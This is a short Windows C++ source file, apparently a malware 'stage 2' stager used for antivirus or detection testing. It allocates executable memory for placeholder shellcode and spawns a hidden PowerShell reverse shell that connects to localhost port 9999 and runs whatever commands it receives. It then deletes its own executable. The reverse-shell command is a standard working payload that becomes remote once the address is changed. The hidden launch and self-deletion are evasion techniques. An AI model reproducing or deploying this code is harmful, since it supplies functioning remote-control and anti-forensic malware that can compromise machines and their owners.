// stager2.cpp - FULLY FIXED (No sprintf_s)
#include <windows.h>
#include <stdio.h>
#include <string.h>

unsigned char fake_shellcode[] = {
    0x90,0x90,0x90,0x90,  // NOP sled
    0x48,0x31,0xc0,0x48,  // Fake shellcode
    0x31,0xd2,0x48,0xff
};

int WINAPI WinMain(HINSTANCE h, HINSTANCE, LPSTR, int) {
    // RWX memory - triggers AV
    LPVOID mem = VirtualAlloc(NULL, sizeof(fake_shellcode), 
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem) {
        memcpy(mem, fake_shellcode, sizeof(fake_shellcode));
    }
    
    // Stage 2: Local reverse shell (connects to localhost:9999)
    STARTUPINFOA si = {sizeof(si)};
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    // Pre-built command (no sprintf needed)
    char cmdline[] = "powershell.exe -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('127.0.0.1',9999);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=$d|iex;$sb2=$sb+'PS '+(pwd).Path+'> ';$sbyte=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sbyte,0,$sbyte.Length);$s.Flush()};$c.Close()\"";
    
    CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    // Cleanup
    if (mem) VirtualFree(mem, 0, MEM_RELEASE);
    Sleep(3000);
    
    // Self-delete
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    Sleep(1000);
    DeleteFileA(selfPath);
    
    return 0;
}